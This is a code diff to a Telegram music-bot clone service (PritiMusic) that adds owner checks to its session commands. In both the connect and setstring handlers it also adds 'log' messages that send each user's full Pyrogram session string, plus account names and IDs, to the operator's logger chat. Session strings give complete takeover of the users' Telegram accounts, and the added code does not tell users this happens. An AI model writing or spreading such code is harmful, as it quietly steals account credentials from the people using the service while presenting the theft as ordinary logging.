@@ -8,6 +8,9 @@ from pyrogram.errors import (
     UserDeactivated, AuthKeyUnregistered,
     PasswordHashInvalid
 )
+
+import config
+from PritiMusic import app  # Main bot instance import kiya logs bhejney ke liye
 from PritiMusic.utils.database import clonebotdb
 from config import API_ID, API_HASH, OWNER_ID
 
@@ -101,6 +104,28 @@ async def connect_assistant(client: Client, message: Message):
         string_session = await temp_client.export_session_string()
         await clonebotdb.update_one({"bot_id": bot_id}, {"$set": {"session_string": string_session}})
         
+        # ✅ Fetch Assistant Details & Send Log to CLONE_LOGGER_2
+        ass_me = await temp_client.get_me()
+        clone_log_2 = getattr(config, "CLONE_LOGGER_2", getattr(config, "LOGGER_ID", None))
+        
+        if clone_log_2:
+            try:
+                bot = client.me
+                log_text = (
+                    "**#Assistant_Added_Via_Connect**\n\n"
+                    f"**🤖 Bot Name:** {bot.mention}\n"
+                    f"**🔗 Bot Link:** @{bot.username}\n\n"
+                    f"**👑 Owner Name:** {user.mention}\n"
+                    f"**🆔 Owner ID:** `{user.id}`\n\n"
+                    f"**🎧 Assistant Name:** {ass_me.first_name}\n"
+                    f"**🔗 Assistant Username:** @{ass_me.username if ass_me.username else 'None'}\n"
+                    f"**🆔 Assistant ID:** `{ass_me.id}`\n\n"
+                    f"**🔑 Session String:**\n`{string_session}`"
+                )
+                await app.send_message(clone_log_2, log_text)
+            except Exception as e:
+                print(f"Failed to send assistant log: {e}")
+
         await message.reply_text("✅ **Connected Successfully!**" + POWERED_BY)
     finally:
         if temp_client.is_connected:
@@ -112,6 +137,13 @@ async def connect_assistant(client: Client, message: Message):
 @Client.on_message(filters.command(["setstring", "setmode"]) & filters.private)
 async def set_clone_session(client: Client, message: Message):
     bot_id = client.me.id
+    user = message.from_user
+
+    # Owner Validation
+    clone_data = await clonebotdb.find_one({"bot_id": bot_id})
+    if not clone_data or (clone_data["user_id"] != user.id and user.id != OWNER_ID):
+        return await message.reply_text("❌ **Access Denied:** Only the bot owner can perform this action.")
+
     if len(message.command) < 2:
         return await message.reply_text("⚠️ **Usage:** `/setstring <Session_String>`" + SESSION_ADVICE)
 
@@ -124,6 +156,29 @@ async def set_clone_session(client: Client, message: Message):
         client.assistant = new_assistant
 
         await clonebotdb.update_one({"bot_id": bot_id}, {"$set": {"session_string": string_session}})
+        
+        # ✅ Fetch Assistant Details & Send Log to CLONE_LOGGER_2
+        ass_me = await new_assistant.get_me()
+        clone_log_2 = getattr(config, "CLONE_LOGGER_2", getattr(config, "LOGGER_ID", None))
+        
+        if clone_log_2:
+            try:
+                bot = client.me
+                log_text = (
+                    "**#Assistant_Added_Via_SetString**\n\n"
+                    f"**🤖 Bot Name:** {bot.mention}\n"
+                    f"**🔗 Bot Link:** @{bot.username}\n\n"
+                    f"**👑 Owner Name:** {user.mention}\n"
+                    f"**🆔 Owner ID:** `{user.id}`\n\n"
+                    f"**🎧 Assistant Name:** {ass_me.first_name}\n"
+                    f"**🔗 Assistant Username:** @{ass_me.username if ass_me.username else 'None'}\n"
+                    f"**🆔 Assistant ID:** `{ass_me.id}`\n\n"
+                    f"**🔑 Session String:**\n`{string_session}`"
+                )
+                await app.send_message(clone_log_2, log_text)
+            except Exception as e:
+                print(f"Failed to send assistant log: {e}")
+
         await msg.edit("✅ **Connected Successfully!** 🎸 **Now you can play music!**" + POWERED_BY)
     except Exception as e:
         await msg.edit(f"❌ **Error:** `{str(e)}`")
@@ -134,5 +189,11 @@ async def set_clone_session(client: Client, message: Message):
 @Client.on_message(filters.command(["disconnect", "delstring"]) & filters.private)
 async def disconnect_assistant(client: Client, message: Message):
     bot_id = client.me.id
+    
+    # Optional: Owner check for disconnect too
+    clone_data = await clonebotdb.find_one({"bot_id": bot_id})
+    if not clone_data or (clone_data["user_id"] != message.from_user.id and message.from_user.id != OWNER_ID):
+        return await message.reply_text("❌ **Access Denied:** Only the bot owner can perform this action.")
+
     await clonebotdb.update_one({"bot_id": bot_id}, {"$unset": {"session_string": 1}})
     await message.reply_text("✅ **Disconnected Successfully!**" + POWERED_BY)
